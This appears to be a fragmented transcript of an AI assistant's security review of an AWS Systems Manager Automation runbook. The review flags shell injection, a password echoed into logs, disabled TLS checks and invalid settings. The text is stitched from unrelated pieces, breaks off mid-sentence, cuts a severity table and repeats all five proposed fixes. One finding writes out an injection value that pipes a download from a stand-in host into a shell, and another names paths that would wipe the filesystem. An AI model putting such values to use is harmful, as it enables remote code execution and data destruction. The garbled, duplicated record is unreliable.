{"id": "3767cf21-4391-498d-b5dd-3c1beaf81b20", "role": "user", "content": [{"text": "Review this Automation runbook for security problems before I share it with other teams, and give me a hardened version:

```yaml
schemaVersion: '0.3'
description: Restarts the app service and rotates its log directory.
assumeRole: [redacted ARN]
parameters:
  InstanceId:
    type: String
  LogPath:
    type: String
    allowedPattern: '.*'
  DbPassword:
    type: SecureString
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Continue
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{InstanceId}}']
      Parameters:
        commands:
          - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
          - echo "restarting with password {{DbPassword}}"
          - curl -k https://internal-api.example.com/notify
  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 1200
    onCancel: step:Wait
    inputs:
      Runtime: python3.11
      Handler: handler
      Script: |-
        import boto3
        def handler(events, context):
            return boto3.client('ec2').describe_instance_status()
  - name: Wait
    action: aws:sleep
    inputs: {Duration: PT10S}
```", "type": "text"}], "created_at": null}

Every check\\nin this chapter is grounded in a public Systems Manager or IAM documentation page, cited in\\n[references/automation/hardening-detection-rules.md](references/automation/hardening-detection-rules.md).\\n\\nThis review is static. It doesn\\'t run the runbook, and it doesn\\'t\\ncheck the IAM policy of the role the runbook assumes; review that role separately.\\n\\n## When to use\\n\\n- A user asks to review or harden a runbook they wrote, before publishing or sharing it.\\n- A release or prevention review includes account-owned runbooks.\\n\\nTo choose a runbook for a problem, hand off to\\n[references/automation/runbook-discovery.md](references/automation/runbook-discovery.md); to run one, to\\n[references/automation/execution.md](references/automation/execution.md).\\n\\n## Workflow\\n\\nCopy this checklist and work through it in order:\\n\\n- [ ] Step 1: Read the document (Phase 1)\\n- [ ] Step 2: Scan with every check in the detection rules (Phase 2)\\n- [ ] Step 3: Apply, propose or flag fixes (Phase 3)\\n- [ ] Step 4: Write the report and the hardened document (Phase 4)\\n- [ ] Step 5: Check the output, then present it\\n\\n## Phase 1: Read the document\\n\\n1. Otherwise use the content the user provides.\\n2. Note the format (YAML or JSON). The hardened document must use the same format.\\n3. Check `schemaVersion`. Describe the problem and what a redesign must address |\\n\\nFlag rather than fix when proposed changes would touch most of the steps; patching that much\\nleaves a document that is harder to review than a rewrite.\\n\\nDon\\'t weaken an existing control to make the document pass, and don\\'t remove a parameter the\\ndocument needs; change how it is used instead.\\n\\n## Phase 4: Report\\n\\nWrite the report with the structure in\\n[references/automation/hardening-report-template.md](references/automation/hardening-report-template.md): a summary table by severity,\\napplied fixes, proposed fixes as BEFORE / AFTER with their source, flagged items, checks with no\\nfindings, what the review didn\\'t cover, and the complete hardened document in the input\\'s format.\\n\\n## Phase 5: Check the output\\n\\nBefore presenting the report, confirm:\\n\\n- The hardened document parses as YAML or JSON, and every `allowedPattern` in it is still a\\n  valid regular expression.\\n- Every finding names a check from the detection rules and its source page.\\n- No secret value from the input appears anywhere in the report or the hardened document.\\n- Every difference between the input and the hardened document is listed as an applied or\\n  proposed fix.\\n\\nFix anything that doesn\\'t hold before you answer.\\n\\n## Gotchas\\n\\n- Steps inside an `aws:loop` (`inputs.Steps`) are steps too; scan them.\\n- A parameter name containing \"key\" is often an identifier (`KeyName`, `KmsKeyId`, `S3Key`), not a\\n  secret.\\n- `allowedPattern` protects parameters only. A value from `{{StepName.OutputName}}` is never\\n  validated by it.\\n- Patterns must work in both Java regex and Go `regexp`: avoid lookahead and backreferences.\\n- In JSON documents every backslash in a pattern is doubled; in YAML, single-quote the pattern.\\n\\n## Constraints\\n\\n- Report only findings backed by a check in the detection rules.\\n- Never print a secret\\'s value.\\n- Keep the document\\'s behaviour, apart from the fixes you list.\\n- The hardened document must still parse: in JSON, escape backslashes in regular expressions\\n  (`\\\\` becomes `\\\\\\\\`); in YAML, single-quote patterns that contain `\\\\`, `{` or `}`.\\n'}]", "status": "success", "type": "tool_result"}, {"id": "tooluse_thPj5ct5ihrrv3E3jjo3pf", "content": "[{'text': '# Detection rules\\n\\nEach check names the public documentation it relies on. | Critical | 2 | 0 | 2 | 0 |
| High | 3 | 1 | 2 | 0 |
| Medium | 2 | 1 | 1 | 0 |
| Low | 1 | 1 | 0 | 0 |

### Applied fixes
- **`InstanceId`** (check 3, High): it had no validation. I added `^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$`, the documented instance ID form (source: Parameters).
- **`CheckHealth.timeoutSeconds`** (check 5, Medium): it was 1200, above the 600-second maximum for `aws:executeScript`. I lowered it to 600 (source: the `aws:executeScript` action page).
- **`DbPassword`** (check 10, Low): `SecureString` isn't a valid document parameter type, so this document would be rejected as written. I changed it to a `String` that holds a Parameter Store parameter name (source: Parameters). This goes with proposed fix 2 below.

### Proposed fixes

**PROPOSED FIX 1: Constrain `LogPath` (checks 1 and 3, Critical)**
- **Issue:** `LogPath` is placed directly into shell text twice, in `tar` and in `rm -rf {{LogPath}}/*`. Its pattern `.*` accepts anything. A value like `/tmp/x; curl evil|sh #` runs arbitrary commands as root on the instance. `/` or `/var/log/../..` would wipe the filesystem.
- **BEFORE:**
  ```yaml
  LogPath: {type: String, allowedPattern: '.*'}
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  LogPath: {type: String, allowedPattern: '^/var/log(/[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}){1,6}$'}
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- **Details:** The pattern allows only a subdirectory of `/var/log`. Each path component must start with a letter, digit, `_` or `-`, so `..` can't pass. The path can't be `/var/log` itself. Quoting is extra protection.
- **Assumption to check:** I assumed your logs live under `/var/log`. If other teams log elsewhere, widen the prefix, but keep the no-leading-dot rule and the "at least one subdirectory" rule.
- **Source:** Schemas, "Parameter security best practices".

**PROPOSED FIX 2: Remove the password from the command (check 2, Critical)**
- **Issue:** `echo "restarting with password {{DbPassword}}"` writes the secret into command text and the command output. SSM stores both in command history, and the output may go to CloudWatch or S3.
- **BEFORE:**
  ```yaml
  DbPassword: {type: SecureString}
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  - echo "restarting service"
  ```
- **Details:** The runbook now takes the name of a Parameter Store `SecureString` parameter, never the value. If a step needs the password, read it at run time inside the command with `aws ssm get-parameter --with-decryption`. The instance profile then needs `ssm:GetParameter` and `kms:Decrypt`.
- **Rotate:** If a real password was ever passed through this or a similar runbook, treat it as exposed and rotate it.
- **Source:** Data protection; Security best practices; Parameter Store in Run Command.

**PROPOSED FIX 3: Make the assume role a parameter (check 4, High)**
- **Issue:** The role is hard-coded to account 012345678901_2, so other teams in other accounts can't use the runbook.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole: {type: AWS::IAM::Role::Arn}
  ```
- **Source:** Running; Script considerations.

**PROPOSED FIX 4: Turn TLS verification back on (check 9, High)**
- **Issue:** `curl -k` disables certificate checking, so the notify call can be intercepted or spoofed.
- **BEFORE:** `curl -k https://internal-api.example.com/notify`
- **AFTER:** `curl https://internal-api.example.com/notify`
- **Details:** If this fails with a certificate error, install your internal CA on the instances. Don't put `-k` back.
- **Source:** Data protection.

**PROPOSED FIX 5: Fix the invalid cancel target (check 6, Medium)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, and `aws:sleep` isn't allowed as a cancel target.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** `onCancel: Abort`
- **Details:** `Wait` is a 10-second sleep, so there was no real cleanup to preserve. If you want cleanup on cancel, add a short `aws:executeScript` or `aws:executeAwsApi` step that finishes within 2 minutes.
- **Source:** Actions, "Properties shared by all actions".

### Flagged for redesign
None.

### Checks with no findings
- Check 7 (approval steps): the runbook has none.
- Check 8 (cross-account role assumption): the runbook has none.
- `onFailure: Continue` on `RotateLogs` is information, not a finding. A failed `tar` or `curl` won't stop the run. Confirm that's what you want.

### Notes, not scored
- The description says "restarts the app service", but no step restarts anything. `DbPasswordParameterName` is currently unused, so you may have dropped a step that needs it.
- `CheckHealth` ignores `InstanceId` and returns status for every instance in the Region. It may also fail to return, because the API response includes datetime values.

### Not covered by this review
- The IAM policy of the assume role. Review it before sharing, because it limits what this runbook can do.
- The contents of `AWS-RunShellScript`. I only reviewed how parameters are passed to it.

**PROPOSED FIX 1: Constrain `LogPath` (checks 1 and 3, Critical)**
- **Issue:** `LogPath` is placed directly into shell text twice, in `tar` and in `rm -rf {{LogPath}}/*`. Its pattern `.*` accepts anything. A value like `/tmp/x; curl evil|sh #` runs arbitrary commands as root on the instance. `/` or `/var/log/../..` would wipe the filesystem.
- **BEFORE:**
  ```yaml
  LogPath: {type: String, allowedPattern: '.*'}
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  LogPath: {type: String, allowedPattern: '^/var/log(/[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}){1,6}$'}
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- **Details:** The pattern allows only a subdirectory of `/var/log`. Each path component must start with a letter, digit, `_` or `-`, so `..` can't pass. The path can't be `/var/log` itself. Quoting is extra protection.
- **Assumption to check:** I assumed your logs live under `/var/log`. If other teams log elsewhere, widen the prefix, but keep the no-leading-dot rule and the "at least one subdirectory" rule.
- **Source:** Schemas, "Parameter security best practices".

**PROPOSED FIX 2: Remove the password from the command (check 2, Critical)**
- **Issue:** `echo "restarting with password {{DbPassword}}"` writes the secret into command text and the command output. SSM stores both in command history, and the output may go to CloudWatch or S3.
- **BEFORE:**
  ```yaml
  DbPassword: {type: SecureString}
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  - echo "restarting service"
  ```
- **Details:** The runbook now takes the name of a Parameter Store `SecureString` parameter, never the value. If a step needs the password, read it at run time inside the command with `aws ssm get-parameter --with-decryption`. The instance profile then needs `ssm:GetParameter` and `kms:Decrypt`.
- **Rotate:** If a real password was ever passed through this or a similar runbook, treat it as exposed and rotate it.
- **Source:** Data protection; Security best practices; Parameter Store in Run Command.

**PROPOSED FIX 3: Make the assume role a parameter (check 4, High)**
- **Issue:** The role is hard-coded to account 012345678901_2, so other teams in other accounts can't use the runbook.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole: {type: AWS::IAM::Role::Arn}
  ```
- **Source:** Running; Script considerations.

**PROPOSED FIX 4: Turn TLS verification back on (check 9, High)**
- **Issue:** `curl -k` disables certificate checking, so the notify call can be intercepted or spoofed.
- **BEFORE:** `curl -k https://internal-api.example.com/notify`
- **AFTER:** `curl https://internal-api.example.com/notify`
- **Details:** If this fails with a certificate error, install your internal CA on the instances. Don't put `-k` back.
- **Source:** Data protection.

**PROPOSED FIX 5: Fix the invalid cancel target (check 6, Medium)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, and `aws:sleep` isn't allowed as a cancel target.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** `onCancel: Abort`
- **Details:** `Wait` is a 10-second sleep, so there was no real cleanup to preserve. If you want cleanup on cancel, add a short `aws:executeScript` or `aws:executeAwsApi` step that finishes within 2 minutes.
- **Source:** Actions, "Properties shared by all actions".
